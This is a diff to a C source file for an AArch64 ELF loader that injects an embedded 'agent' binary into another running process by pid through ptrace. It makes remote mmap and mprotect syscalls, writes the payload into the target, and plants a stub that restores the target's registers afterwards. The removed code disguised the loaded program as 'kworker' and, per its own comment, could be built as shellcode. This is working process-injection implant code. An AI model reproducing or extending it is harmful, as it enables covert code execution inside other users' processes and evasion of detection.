@@ -2,7 +2,11 @@
 #include <sys/mman.h>
 #include <stdint.h>
 #include "agent.h"
-#include "functions-aarch64.h"
+#include "cleanup.h"
+// #include "functions-aarch64.h"
+#include "ptrace_aarch64_reg.h"
+#include "param_struct.h"
+#include "reimplement.h"
 
 #define ElfN_Ehdr Elf64_Ehdr
 #define ElfN_Phdr Elf64_Phdr
@@ -30,29 +34,29 @@ int is_image_valid(ElfN_Ehdr *hdr) {
     return 1;
 }
 
-__attribute__((noreturn))
-void arm_jump(ElfN_Addr sp, void *entry) {
-    register ElfN_Addr r_sp asm("x4") = sp;
-    register void *r_entry asm("x5") = entry;
+// __attribute__((noreturn))
+// void arm_jump(ElfN_Addr sp, void *entry) {
+//     register ElfN_Addr r_sp asm("x4") = sp;
+//     register void *r_entry asm("x5") = entry;
     
-    asm volatile(
-        "mov sp, x4\n"
-        "mov x0, xzr\n"
-        "mov x1, xzr\n"
-        "mov x2, xzr\n"
-        "mov x3, xzr\n"
-        "isb\n"
-        "br x5\n"
-        : : "r"(r_sp), "r"(r_entry) : "x0", "x1", "x2", "x3", "memory"
-    );
-    __builtin_unreachable();
-}
+//     asm volatile(
+//         "mov sp, x4\n"
+//         "mov x0, xzr\n"
+//         "mov x1, xzr\n"
+//         "mov x2, xzr\n"
+//         "mov x3, xzr\n"
+//         "isb\n"
+//         "br x5\n"
+//         : : "r"(r_sp), "r"(r_entry) : "x0", "x1", "x2", "x3", "memory"
+//     );
+//     __builtin_unreachable();
+// }
 
-int load_image(char *elf_start) {
-    ElfN_Ehdr *hdr = (ElfN_Ehdr *)elf_start;
+int *load_image(struct loader_params *params) {
+    ElfN_Ehdr *hdr = (ElfN_Ehdr *)agent;
     if (!is_image_valid(hdr)) return 0;
 
-    ElfN_Phdr *phdr = (ElfN_Phdr *)(elf_start + hdr->e_phoff);
+    ElfN_Phdr *phdr = (ElfN_Phdr *)(agent + hdr->e_phoff);
     ElfN_Addr min_vaddr = UINT64_MAX;
     ElfN_Addr max_vaddr = 0;
     
@@ -74,21 +78,28 @@ int load_image(char *elf_start) {
     }
 
     size_t memsz = max_vaddr - min_vaddr;
+    struct cleanup clean = {0};
 
-    size_t alloc_sz = memsz + PAGESIZE;
-    char *mapping_raw = sys_mmap(NULL, alloc_sz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if ((long)mapping_raw < 0) return -1;
+    clean.a_size = memsz + PAGESIZE;
+    // Backup of code:
+    // char *mapping_raw = sys_mmap(NULL, alloc_sz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    unsigned long syscall_result = 0;
+    remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mmap, 0, clean.a_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0, &syscall_result);
+    clean.a_addr = (uint64_t)syscall_result;
+    
+    if ((long)clean.a_addr <= 0) return NULL;
 
-    ElfN_Addr pie_base = (ElfN_Addr)(((uintptr_t)mapping_raw + (PAGESIZE - 1)) & ~(uintptr_t)(PAGESIZE - 1)) - min_vaddr;
+    ElfN_Addr pie_base = (ElfN_Addr)(((uintptr_t)clean.a_addr + (PAGESIZE - 1)) & ~(uintptr_t)(PAGESIZE - 1)) - min_vaddr;
+    // for (int i = 0; i < seg_count; i++) {
+    //     void *dst = (void *)(pie_base + segments[i].vaddr); 
+    //     void *src = (void *)(agent + segments[i].offset);
+    //     sys_memcpy(dst, src, segments[i].filesz);
+    //     if (segments[i].memsz > segments[i].filesz) {
+    //         sys_memset((char *)dst + segments[i].filesz, 0, segments[i].memsz - segments[i].filesz); 
+    //     }
+    // }
 
-    for (int i = 0; i < seg_count; i++) {
-        void *dst = (void *)(pie_base + segments[i].vaddr); 
-        void *src = (void *)(elf_start + segments[i].offset);
-        sys_memcpy(dst, src, segments[i].filesz);
-        if (segments[i].memsz > segments[i].filesz) {
-            sys_memset((char *)dst + segments[i].filesz, 0, segments[i].memsz - segments[i].filesz); 
-        }
-    }
+    write_payload(params->pid, (long)clean.a_addr, agent, agent_len);
 
     // apply memory protections
     for (int i = 0; i < seg_count; i++) {
@@ -104,57 +115,99 @@ int load_image(char *elf_start) {
         if (segments[i].flags & PF_W) prot |= PROT_WRITE;
         if (segments[i].flags & PF_X) prot |= PROT_EXEC;
         
-        sys_mprotect((void *)aligned_start, aligned_end - aligned_start, prot);
+        // sys_mprotect((void *)aligned_start, aligned_end - aligned_start, prot);
+        remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mprotect, (unsigned long)aligned_start, aligned_end - aligned_start, prot, 0, 0, 0, &syscall_result);
     }
 
-    void *entry_point = (void *)(pie_base + hdr->e_entry);
+    params->entry_point = (void *)(pie_base + hdr->e_entry);
 
-    // fake stack
-    size_t stack_size = 3 * 1024 * 1024;
-    char *stack = sys_mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if ((long)stack < 0) return 0;
+    size_t b_code_map_len = align_up(cleanup_len, PAGESIZE);
+    size_t ctx_map_len    = align_up(sizeof(clean), PAGESIZE);
+    size_t b_alloc_len    = b_code_map_len + ctx_map_len;
+
+    unsigned long b_remote = 0;
+    remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mmap, 0, b_alloc_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0, &b_remote);
     
-    char *sp = stack + stack_size;
-
-    sp -= 16;
-    sys_memset(sp, 0x41, 16);
-    char *randbuf = sp;
-
-    sp -= 8;
-    sys_memcpy(sp, "kworker\0", 8);
-    char *execfn = sp;
-
-    // argc(1) + argv[0](1) + argv_null(1) + envp_null(1) + auxv(10) = 14 words
-    sp -= (14 * sizeof(ElfN_Addr));
-    sp = (char *)((uintptr_t)sp & ~0xF); // Force strict 16-byte stack alignment
+    uintptr_t ctx_remote = b_remote + b_code_map_len;
+    clean.b_addr = b_remote;
+    clean.b_size = b_alloc_len;
+    // memcpy(clean.x, params->backup.regs, sizeof(clean.x));
     
-    ElfN_Addr *out = (ElfN_Addr *)sp;
-    *out++ = 1;                         // argc
-    *out++ = (ElfN_Addr)execfn;         // argv[0]
-    *out++ = 0;                         // argv terminator
-    *out++ = 0;                         // envp terminator
+    clean.x[0] = params->backup.regs[0];
+    for (int i = 1; i < 31; i++) {
+        clean.x[i] = params->backup.regs[i];
+    }
+
+    clean.sp = params->backup.sp;
+    clean.pc = params->backup.pc;
+    clean.pstate = params->backup.pstate;
+    clean.tpidr_el0 = params->tls_backup;
+    clean.page_size = PAGESIZE;
+
+    clean.stub_dst = align_down(clean.sp - PAGESIZE - 256, 16);
+
+    // cleanup code
+    write_payload(params->pid, b_remote, (unsigned char *)&cleanup, cleanup_len);
+    remote_syscall(params->pid, params->regs, params->syscall_pc, __NR_mprotect, b_remote, b_code_map_len, PROT_READ | PROT_EXEC, 0, 0, 0, &syscall_result);
+
+    //struct
+    // uintptr_t ctx_remote  = align_up(clean.b_addr + cleanup_len, 16);
+    write_payload(params->pid, ctx_remote, (unsigned char *)&clean, sizeof(clean));
+    params->cleanup_ctx_addr = ctx_remote;
+
+    memset(&clean, 0, sizeof(clean));
+    __asm__ __volatile__("" ::: "memory");
+    // void *entry_point = (void *)(pie_base + hdr->e_entry);
+
+    // // fake stack
+    // size_t stack_size = 3 * 1024 * 1024;
+    // //char *stack = sys_mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    // remote_syscall(params->pid, &params->regs, params->syscall_pc, __NR_mmap, 0, stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0, &syscall_result);
+    // void *stack = (void *)syscall_result;
+    // if ((long)stack < 0) return 0;
     
-    *out++ = AT_PHDR;   *out++ = pie_base + hdr->e_phoff;
-    *out++ = AT_PHENT;  *out++ = hdr->e_phentsize;
-    *out++ = AT_PHNUM;  *out++ = hdr->e_phnum;
-    *out++ = AT_PAGESZ; *out++ = PAGESIZE;
-    *out++ = AT_RANDOM; *out++ = (ElfN_Addr)randbuf;
-    *out++ = AT_NULL;   *out++ = 0;
+    // char *sp = (char *)stack + stack_size;
 
-    arm_jump((ElfN_Addr)sp, entry_point);
-    return 1;
-}
+    // sp -= 16;
+    // sys_memset(sp, 0x41, 16);
+    // char *randbuf = sp;
 
-__asm__ (
-    ".section .text.entry\n"
-    ".global _start\n"
-    "_start:\n"
-    "bl main_loader\n"
-    "brk #0\n" // Trap if main_loader returns unexpectedly
-);
+    // sp -= 8;
+    // sys_memcpy(sp, "kworker\0", 8);
+    // char *execfn = sp;
 
-__attribute__((used))
-int main_loader(void) {
-    load_image((char *)agent);
+    // // argc(1) + argv[0](1) + argv_null(1) + envp_null(1) + auxv(10) = 14 words
+    // sp -= (16 * sizeof(ElfN_Addr));
+    // sp = (char *)((uintptr_t)sp & ~0xF); // Force strict 16-byte stack alignment
+    
+    // ElfN_Addr *out = (ElfN_Addr *)sp;
+    // *out++ = 1;                         // argc
+    // *out++ = (ElfN_Addr)execfn;         // argv[0]
+    // *out++ = 0;                         // argv terminator
+    // *out++ = 0;                         // envp terminator
+    
+    // *out++ = AT_PHDR;   *out++ = pie_base + hdr->e_phoff;
+    // *out++ = AT_PHENT;  *out++ = hdr->e_phentsize;
+    // *out++ = AT_PHNUM;  *out++ = hdr->e_phnum;
+    // *out++ = AT_PAGESZ; *out++ = PAGESIZE;
+    // *out++ = AT_RANDOM; *out++ = (ElfN_Addr)randbuf;
+    // *out++ = AT_NULL;   *out++ = 0;
+
+    // arm_jump((ElfN_Addr)sp, entry_point);
     return 0;
 }
+
+// Code is used to turn the loader into shellcode if desired.
+// __asm__ (
+//     ".section .text.entry\n"
+//     ".global _start\n"
+//     "_start:\n"
+//     "bl main_loader\n"
+//     "brk #0\n" // Trap if main_loader returns unexpectedly
+// );
+
+// __attribute__((used))
+// int main_loader(void) {
+//     load_image((char *)agent);
+//     return 0;
+// }
